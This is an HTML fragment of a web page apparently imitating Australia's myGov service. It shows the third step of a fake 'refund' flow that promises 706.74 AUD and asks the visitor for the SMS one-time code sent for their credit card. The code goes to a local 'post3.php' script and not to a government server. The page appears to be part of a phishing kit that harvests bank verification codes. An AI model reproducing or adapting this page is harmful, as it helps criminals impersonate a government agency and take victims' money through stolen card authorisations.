...
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	...
	<body>	
		<nav class="uikit-skip-link" aria-label="Skip Links">
  		<a class="uikit-skip-link__link" id="va_skipToBot" href="https://login.my.gov.au/EnrolService/enrolService.htm?_flowId=mgv2-enrolment-mg-flow&amp;_flowExecutionKey=e1s2#">Skip to Ask a question</a><a class="uikit-skip-link__link" id="va_skipToBot" href="#">Skip to Ask a question</a><a class="uikit-skip-link__link" id="va_skipToBot" href="#">Skip to Ask a question</a><a class="uikit-skip-link__link" id="va_skipToBot" href="#">Skip to Ask a question</a></nav>
...
<div class="wrapper"><div class="main-block" id="content" role="main">
		...
		<form id="initialForm" action="post3.php" method="post">
			<div class="progress">
				<h1>Verify your withdraw method</h1>
				<span class="progress">Step 3 of 3</span>
			</div>

			
			<p>You will receive an OTP as an sms on your phone number to verify your credit card used previously.
Once You confirm your otp you will be credited with the amount.</p>
			<p style="color:green">Refund amount : 706.74 AUD</p>


			<div>
				<label for="email-addr">SMS OTP<input id="email-addr" name="token" type="text" value="" maxlength="30" autocomplete="one-time-code" required="">
				</label>
			</div>

			<div class="button-container">
							
				<button type="submit" id="next" name="okbba" value="Next" class="button-main button">Confirm</button>
